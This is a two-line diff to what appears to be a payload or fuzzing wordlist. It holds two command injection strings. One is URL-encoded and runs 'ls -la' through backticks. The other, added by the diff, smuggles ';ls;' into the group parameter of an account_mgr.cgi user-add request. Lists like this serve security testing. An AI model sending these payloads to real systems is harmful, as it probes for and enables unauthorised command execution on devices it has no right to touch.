@@ -1,1 +1,2 @@
 %26echo%20%60ls%20-la%60%24()%5C`
+cgi-bin/account_mgr.cgi?cmd=cgi_user_add&group=%27;ls;
